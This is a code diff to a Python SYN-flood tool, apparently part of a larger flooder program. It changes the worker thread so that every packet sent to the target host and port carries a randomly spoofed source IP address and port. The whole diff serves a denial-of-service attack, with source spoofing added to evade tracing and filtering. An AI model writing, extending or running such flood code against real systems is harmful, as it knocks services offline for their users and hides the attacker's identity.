@@ -12,6 +12,9 @@ class SYNWorkerThread(Process):
         self.wait = flooder.wait
         self.running = True
         self.byteCount = 0
+        self.host = flooder.host
+        self.port = flooder.port
+        # now just used for init check to make sure sucess
         self.socket = synmod.createSocket()
         
         if self.socket == -1:
@@ -25,6 +28,10 @@ class SYNWorkerThread(Process):
     def run(self):
         try:
             while self.running:
+                srchost = ".".join(str(random.randrange(1, 255)) for i in range(4))
+                srcport = random.randrange(1024, 65534)
+                synmod.init(srchost, srcport, self.host, self.port)
+                self.socket = synmod.createSocket()
                 ret = synmod.send(self.socket)
                 if ret == -1:
                     self.running = False
